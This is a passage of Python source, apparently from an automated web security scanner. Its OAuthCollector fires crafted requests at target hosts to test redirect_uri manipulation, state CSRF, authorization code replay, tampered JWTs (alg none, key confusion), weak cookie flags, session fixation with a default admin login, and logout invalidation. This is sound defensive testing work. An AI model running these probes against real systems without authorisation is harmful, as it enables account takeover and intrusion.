        """Plugin adapter entrypoint executing the collector."""
        return self.collect(mission)

    def _execute_request(
        self,
        mission: Any,
        method: str,
        url: str,
        params: Optional[Dict[str, Any]] = None,
        data: Optional[Dict[str, Any]] = None,
        json_data: Optional[Any] = None,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
    ) -> Optional[HttpResponse]:
        """
        Dispatches HTTP requests respecting custom mock clients, MultiIdentitySessionCoordinator,
        or AuthenticatedHttpClient.
        """
        method = method.upper()
        req_headers = dict(headers or {})
        req_cookies = dict(cookies or {})

        try:
            if self.custom_http_client is not None:
                # Mock client with .get / .post
                if method == "GET" and hasattr(self.custom_http_client, "get"):
                    try:
                        return self.custom_http_client.get(
                            mission, url, params=params, headers=req_headers, cookies=req_cookies, timeout=self.timeout
                        )
                    except TypeError:
                        try:
                            return self.custom_http_client.get(url, params=params, headers=req_headers, cookies=req_cookies)
                        except TypeError:
                            return self.custom_http_client.get(url)
                elif method == "POST" and hasattr(self.custom_http_client, "post"):
                    try:
                        return self.custom_http_client.post(
                            mission, url, data=data, json=json_data, headers=req_headers, cookies=req_cookies, timeout=self.timeout
                        )
                    except TypeError:
                        try:
                            return self.custom_http_client.post(url, data=data, json=json_data, headers=req_headers, cookies=req_cookies)
                        except TypeError:
                            return self.custom_http_client.post(url)
                elif hasattr(self.custom_http_client, "request"):
                    try:
                        return self.custom_http_client.request(
                            mission, method, url, params=params, data=data, json=json_data, headers=req_headers, cookies=req_cookies, timeout=self.timeout
                        )
                    except TypeError:
                        return self.custom_http_client.request(method, url)
                elif callable(self.custom_http_client):
                    return self.custom_http_client(url)

            # Production execution with AuthenticatedHttpClient
            with AuthenticatedHttpClient(timeout=self.timeout, max_retries=1) as client:
                if method == "GET":
                    return client.get(mission, url, params=params, headers=req_headers, cookies=req_cookies, timeout=self.timeout)
                elif method == "POST":
                    return client.post(mission, url, data=data, json=json_data, headers=req_headers, cookies=req_cookies, timeout=self.timeout)
                else:
                    return client.request(mission, method, url, params=params, data=data, json=json_data, headers=req_headers, cookies=req_cookies, timeout=self.timeout)

        except Exception as e:
            logger.debug(f"OAuthCollector request failed for {url}: {e}")
            return None

    def _extract_candidate_endpoints(self, raw_mission: Any) -> List[Dict[str, Any]]:
        """
        Extracts candidate endpoints from mission state, categorizing them as
        OAuth authorization endpoints, token endpoints, protected APIs, login, or logout routes.
        """
        candidates: List[Dict[str, Any]] = []
        seen_urls: Set[str] = set()

        endpoints = getattr(raw_mission, "endpoints", []) or []
        for ep in endpoints:
            url = None
            method = "GET"
            params: Dict[str, Any] = {}
            body: Any = None
            headers: Dict[str, str] = {}

            if isinstance(ep, str):
                url = ep
            elif isinstance(ep, dict):
                url = ep.get("url") or ep.get("endpoint") or ep.get("path")
                method = ep.get("method", "GET").upper()
                params = ep.get("params") or {}
                body = ep.get("body")
                headers = ep.get("headers") or {}
            elif hasattr(ep, "url"):
                url = getattr(ep, "url")
                method = getattr(ep, "method", "GET")

            if url and isinstance(url, str) and url not in seen_urls:
                seen_urls.add(url)
                parsed = urllib.parse.urlparse(url)
                base_url = f"{parsed.scheme}://{parsed.netloc}" if parsed.netloc else ""
                candidates.append({
                    "url": url,
                    "base_url": base_url,
                    "path": parsed.path or "/",
                    "method": method,
                    "params": params,
                    "body": body,
                    "headers": headers,
                    "query": parsed.query or "",
                    "source": "mission.endpoints",
                })

        # Inspect live_hosts or target
        live_hosts = getattr(raw_mission, "live_hosts", []) or []
        target = getattr(raw_mission, "target", "") or ""
        host_urls: List[str] = []

        for lh in live_hosts:
            if isinstance(lh, str) and lh.startswith("http"):
                host_urls.append(lh)
            elif isinstance(lh, dict) and lh.get("url"):
                host_urls.append(lh["url"])
            elif isinstance(lh, str) and lh:
                host_urls.append(f"http://{lh}")

        if not host_urls and target:
            host_urls.append(target if target.startswith("http") else f"http://{target}")

        for base_url in host_urls:
            parsed_base = urllib.parse.urlparse(base_url)
            clean_base = f"{parsed_base.scheme}://{parsed_base.netloc}" if parsed_base.netloc else base_url

            # If no candidates or very few, seed standard OAuth / API probe routes
            if len(candidates) < 3:
                for route in DEFAULT_OAUTH_PROBE_ROUTES + DEFAULT_PROTECTED_API_ROUTES:
                    probe_url = f"{clean_base.rstrip('/')}{route}"
                    if probe_url not in seen_urls:
                        seen_urls.add(probe_url)
                        candidates.append({
                            "url": probe_url,
                            "base_url": clean_base,
                            "path": route,
                            "method": "GET",
                            "params": {},
                            "body": None,
                            "headers": {},
                            "query": "",
                            "source": "default_probe",
                        })

        return candidates

    def _create_evidence_and_update_state(
        self,
        mission: Any,
        target_url: str,
        base_url: str,
        category: str,
        analysis: Dict[str, Any],
    ) -> Evidence:
        """
        Creates confirmed Evidence object, appends to mission.evidence & mission.vulnerabilities,
        and expands KnowledgeGraph nodes and HAS_ENDPOINT and HAS_VULNERABILITY edges.
        """
        raw_mission = getattr(mission, "_mission", mission)
        template_id = analysis.get("template_id", "oauth-misconfiguration")
        misconfig_type = analysis.get("misconfiguration_type", "generic")
        severity = analysis.get("severity", "high")
        confidence = analysis.get("confidence", 0.95)
        param = analysis.get("parameter", "")
        payload = analysis.get("payload", "")
        snippet = analysis.get("snippet", "")
        status_code = analysis.get("status_code", 200)
        desc = analysis.get("description", f"OAuth/OIDC Authentication vulnerability: {misconfig_type}")

        parsed_url = urllib.parse.urlparse(target_url)
        clean_base = base_url or (f"{parsed_url.scheme}://{parsed_url.netloc}" if parsed_url.netloc else target_url)

        title = f"OAuth / Stateful Auth Vulnerability ({misconfig_type.replace('_', ' ').title()}) on {target_url}"

        ev = Evidence(
            mission_id=getattr(raw_mission, "id", ""),
            source_type="LOG",
            created_by="SYSTEM_GENERATED",
            title=title,
            description=desc,
            category=category,
            value=target_url,
            source=target_url,
            status="CONFIRMED",
            confidence=confidence,
            severity=severity,
            provenance=ProvenanceData(step_id="oauth_collector"),
            tags=["oauth", "oidc", "token_validation", "session_management", misconfig_type, template_id],
            metadata={
                "url": target_url,
                "host": clean_base,
                "path": parsed_url.path or "/",
                "parameter": param,
                "payload": str(payload),
                "category": category,
                "severity": severity,
                "misconfiguration_type": misconfig_type,
                "template_id": template_id,
                "status_code": status_code,
                "evidence_snippet": snippet[:250],
                **{k: v for k, v in analysis.items() if k not in ("vulnerable", "snippet", "description")},
            },
        )

        # 1. Add to mission.evidence
        if hasattr(raw_mission, "evidence") and raw_mission.evidence is not None:
            if hasattr(raw_mission.evidence, "add"):
                raw_mission.evidence.add(ev)
            elif isinstance(raw_mission.evidence, list):
                raw_mission.evidence.append(ev)

        # 2. Add to mission.vulnerabilities
        if hasattr(raw_mission, "vulnerabilities") and isinstance(raw_mission.vulnerabilities, list):
            raw_mission.vulnerabilities.append({
                "name": title,
                "template_id": template_id,
                "severity": severity,
                "category": category,
                "host": clean_base,
                "url": target_url,
                "description": desc,
                "parameter": param,
                "misconfiguration_type": misconfig_type,
                "evidence_snippet": snippet[:250],
            })

        # 3. KnowledgeGraph Node & Edge Expansion
        graph = getattr(raw_mission, "attack_surface_graph", None) or getattr(raw_mission, "graph", None)
        if graph is not None and hasattr(graph, "add") and hasattr(graph, "connect"):
            lh_id = f"live_host:{clean_base}"
            ep_id = f"endpoint:{target_url}"
            vuln_id = f"vulnerability:{template_id}:{target_url}:{param}" if param else f"vulnerability:{template_id}:{target_url}"

            graph.add(Node(id=lh_id, type="live_host", value=clean_base, metadata={"url": clean_base}))
            graph.add(Node(id=ep_id, type="endpoint", value=target_url, metadata={"url": target_url, "status_code": status_code}))
            graph.add(Node(id=vuln_id, type="vulnerability", value=title, metadata=ev.metadata))

            graph.connect(lh_id, ep_id, edge_type="HAS_ENDPOINT")
            graph.connect(lh_id, vuln_id, edge_type="HAS_VULNERABILITY")
            graph.connect(ep_id, vuln_id, edge_type="HAS_VULNERABILITY")

        # 4. ControlledMission publish
        if mission is not raw_mission and hasattr(mission, "publish_finding"):
            try:
                mission.publish_finding(ev.evidence_id if hasattr(ev, "evidence_id") else getattr(ev, "id", ""), ev)
            except Exception:
                pass

        return ev

    def collect(self, mission: Any) -> List[Evidence]:
        """
        Main collection routine: fuzzes candidate endpoints across R1 (OAuth flows),
        R2 (JWT token validation), and R3 (stateful session management).
        """
        raw_mission = getattr(mission, "_mission", mission)
        candidates = self._extract_candidate_endpoints(raw_mission)
        if not candidates:
            logger.info("OAuthCollector: No candidate endpoints found to test.")
            return []

        logger.info(f"OAuthCollector: Testing {len(candidates)} candidate endpoints for auth vulnerabilities...")
        detected_evidence: List[Evidence] = []
        confirmed_keys: Set[str] = set()

        for cand in candidates:
            url = cand["url"]
            base_url = cand.get("base_url") or ""
            path = cand.get("path") or ""
            query = cand.get("query") or ""
            method = cand.get("method", "GET")

            # -------------------------------------------------------------
            # 1. R1: OAuth/OIDC Authorization Endpoint Testing
            # -------------------------------------------------------------
            is_auth_endpoint = any(p.search(path) for p in OAUTH_AUTH_ROUTE_PATTERNS) or "redirect_uri=" in url or "response_type=" in url or "client_id=" in url or "oauth" in path or "authorize" in path

            if is_auth_endpoint:
                # 1.1 Redirect URI Manipulation (Open Redirect, Subdomain, Traversal)
                redirect_payloads = self.generator.generate_redirect_uri_payloads(url, base_url)
                for pmeta in redirect_payloads:
                    manip_uri = pmeta["redirect_uri"]
                    
                    # Build target test URL with injected redirect_uri
                    if "?" in url:
                        # Replace or append redirect_uri
                        parsed_u = urllib.parse.urlparse(url)
                        q_dict = urllib.parse.parse_qs(parsed_u.query)
                        q_dict["redirect_uri"] = [manip_uri]
                        if "client_id" not in q_dict:
                            q_dict["client_id"] = ["test_client_id"]
                        if "response_type" not in q_dict:
                            q_dict["response_type"] = ["code"]
                        new_query = urllib.parse.urlencode(q_dict, doseq=True)
                        test_url = urllib.parse.urlunparse(parsed_u._replace(query=new_query))
                    else:
                        test_url = f"{url}?client_id=test_client_id&response_type=code&redirect_uri={urllib.parse.quote_plus(manip_uri)}"

                    resp = self._execute_request(raw_mission, "GET", test_url)
                    verdict = self.oauth_analyzer.analyze_redirect_uri_response(resp, pmeta, test_url)
                    if verdict and verdict.get("vulnerable"):
                        key = f"{verdict['misconfiguration_type']}:{url}:{pmeta['type']}"
                        if key not in confirmed_keys:
                            confirmed_keys.add(key)
                            ev = self._create_evidence_and_update_state(
                                mission, url, base_url, "oauth_misconfiguration", verdict
                            )
                            detected_evidence.append(ev)

                # 1.2 State Parameter CSRF Validation
                state_payloads = self.generator.generate_state_payloads()
                for smeta in state_payloads:
                    state_val = smeta["state_value"]
                    parsed_u = urllib.parse.urlparse(url)
                    q_dict = urllib.parse.parse_qs(parsed_u.query)
                    if state_val is not None:
                        q_dict["state"] = [state_val]
                    else:
                        q_dict.pop("state", None)
                    if "client_id" not in q_dict:
                        q_dict["client_id"] = ["test_client_id"]
                    if "response_type" not in q_dict:
                        q_dict["response_type"] = ["code"]
                    new_query = urllib.parse.urlencode(q_dict, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed_u._replace(query=new_query))

                    resp = self._execute_request(raw_mission, "GET", test_url)
                    verdict = self.oauth_analyzer.analyze_state_validation(resp, smeta)
                    if verdict and verdict.get("vulnerable"):
                        key = f"{verdict['misconfiguration_type']}:{url}:{smeta['type']}"
                        if key not in confirmed_keys:
                            confirmed_keys.add(key)
                            ev = self._create_evidence_and_update_state(
                                mission, url, base_url, "oauth_misconfiguration", verdict
                            )
                            detected_evidence.append(ev)

                # 1.3 Referer Leakage
                resp = self._execute_request(raw_mission, "GET", url)
                verdict = self.oauth_analyzer.analyze_referer_leakage(resp, url)
                if verdict and verdict.get("vulnerable"):
                    key = f"referer_leakage:{url}"
                    if key not in confirmed_keys:
                        confirmed_keys.add(key)
                        ev = self._create_evidence_and_update_state(
                            mission, url, base_url, "oauth_misconfiguration", verdict
                        )
                        detected_evidence.append(ev)

            # -------------------------------------------------------------
            # 1.4 Authorization Code Reuse Testing (Token Endpoints)
            # -------------------------------------------------------------
            is_token_endpoint = any(p.search(path) for p in OAUTH_TOKEN_ROUTE_PATTERNS) or "oauth/token" in path
            if is_token_endpoint:
                code_payload = {
                    "grant_type": "authorization_code",
                    "code": "REPLAYABLE_AUTH_CODE_12345",
                    "client_id": "test_app",
                    "redirect_uri": f"{base_url}/callback",
                }
                resp1 = self._execute_request(raw_mission, "POST", url, data=code_payload)
                resp2 = self._execute_request(raw_mission, "POST", url, data=code_payload)
                verdict = self.oauth_analyzer.analyze_code_reuse(resp1, resp2)
                if verdict and verdict.get("vulnerable"):
                    key = f"code_reuse:{url}"
                    if key not in confirmed_keys:
                        confirmed_keys.add(key)
                        ev = self._create_evidence_and_update_state(
                            mission, url, base_url, "oauth_misconfiguration", verdict
                        )
                        detected_evidence.append(ev)

            # -------------------------------------------------------------
            # 2. R2: Token Validation & JWT Tampering Testing
            # -------------------------------------------------------------
            is_api_or_protected = any(p.search(path) for p in PROTECTED_API_PATTERNS) or "api" in path or "user" in path or "admin" in path or not is_auth_endpoint
            if is_api_or_protected:
                jwt_payloads = self.generator.generate_tampered_jwt_payloads()
                for jmeta in jwt_payloads:
                    token = jmeta["token"]
                    ttype = jmeta["type"]
                    auth_header = {"Authorization": f"Bearer {token}"}
                    resp = self._execute_request(raw_mission, method, url, headers=auth_header)

                    verdict = None
                    if "alg_none" in ttype:
                        verdict = self.token_analyzer.analyze_alg_none(resp)
                    elif ttype == "invalid_signature":
                        verdict = self.token_analyzer.analyze_signature_bypass(resp)
                    elif ttype == "key_confusion":
                        verdict = self.token_analyzer.analyze_key_confusion(resp)
                    elif ttype in ("expired_token", "invalid_audience", "invalid_issuer", "future_nbf"):
                        claim_name = ttype.split("_")[0] if ttype != "future_nbf" else "nbf"
                        verdict = self.token_analyzer.analyze_claims_validation(resp, claim_name)
                    elif ttype == "scope_escalation":
                        verdict = self.token_analyzer.analyze_scope_escalation(resp)

                    if verdict and verdict.get("vulnerable"):
                        key = f"{verdict['misconfiguration_type']}:{url}:{ttype}"
                        if key not in confirmed_keys:
                            confirmed_keys.add(key)
                            ev = self._create_evidence_and_update_state(
                                mission, url, base_url, "token_validation", verdict
                            )
                            detected_evidence.append(ev)

            # -------------------------------------------------------------
            # 3. R3: Stateful Authentication & Session Analysis
            # -------------------------------------------------------------
            # 3.1 Cookie Security Attributes
            probe_resp = self._execute_request(raw_mission, method, url)
            if probe_resp and probe_resp.headers:
                set_cookie_raw = probe_resp.headers.get("Set-Cookie") or probe_resp.headers.get("set-cookie") or ""
                cookie_headers = [c.strip() for c in set_cookie_raw.split("\n") if c.strip()] if "\n" in set_cookie_raw else ([set_cookie_raw] if set_cookie_raw else [])
                
                cookie_verdicts = self.session_analyzer.analyze_cookie_security(cookie_headers, url)
                for cverdict in cookie_verdicts:
                    key = f"cookie_flags:{url}:{cverdict.get('cookie_name')}"
                    if key not in confirmed_keys:
                        confirmed_keys.add(key)
                        ev = self._create_evidence_and_update_state(
                            mission, url, base_url, "session_management", cverdict
                        )
                        detected_evidence.append(ev)

            # 3.2 Session Fixation Testing on Login Endpoints
            is_login_endpoint = any(p.search(path) for p in LOGIN_ROUTE_PATTERNS) or "login" in path or "signin" in path
            if is_login_endpoint:
                pre_auth_cookie_val = "FIXATED_SESSION_ID_PRE_AUTH_9999"
                login_payload = {"username": "admin", "password": "password123"}
                login_resp = self._execute_request(
                    raw_mission,
                    "POST",
                    url,
                    data=login_payload,
                    cookies={"session_id": pre_auth_cookie_val, "sess": pre_auth_cookie_val},
                )
                if login_resp and login_resp.headers:
                    post_set_cookie = login_resp.headers.get("Set-Cookie") or login_resp.headers.get("set-cookie") or ""
                    # If server does not issue a new Set-Cookie or returns the same pre-auth cookie
                    if pre_auth_cookie_val in post_set_cookie or not post_set_cookie:
                        verdict = self.session_analyzer.analyze_session_fixation(pre_auth_cookie_val, pre_auth_cookie_val, url)
                        if verdict and verdict.get("vulnerable"):
                            key = f"session_fixation:{url}"
                            if key not in confirmed_keys:
                                confirmed_keys.add(key)
                                ev = self._create_evidence_and_update_state(
                                    mission, url, base_url, "session_management", verdict
                                )
                                detected_evidence.append(ev)

            # 3.3 Insufficient Logout Invalidation
            is_logout_endpoint = any(p.search(path) for p in LOGOUT_ROUTE_PATTERNS) or "logout" in path
            if is_logout_endpoint:
                # 1. Execute logout request
                logout_resp = self._execute_request(raw_mission, "POST", url, cookies={"session_id": "ACTIVE_LOGOUT_TEST_COOKIE"})
                # 2. Check if a protected route still accepts the token
                protected_url = f"{base_url}/api/user/profile" if base_url else f"{url}/../user/profile"
                post_logout_resp = self._execute_request(raw_mission, "GET", protected_url, cookies={"session_id": "ACTIVE_LOGOUT_TEST_COOKIE"})
                verdict = self.session_analyzer.analyze_logout_invalidation(post_logout_resp)
                if verdict and verdict.get("vulnerable"):
                    key = f"logout_invalidation:{url}"
                    if key not in confirmed_keys:
                        confirmed_keys.add(key)
                        ev = self._create_evidence_and_update_state(
                            mission, url, base_url, "session_management", verdict
                        )
                        detected_evidence.append(ev)

        logger.info(f"OAuthCollector: Testing complete. Emitted {len(detected_evidence)} evidence finding(s).")
        return detected_evidence
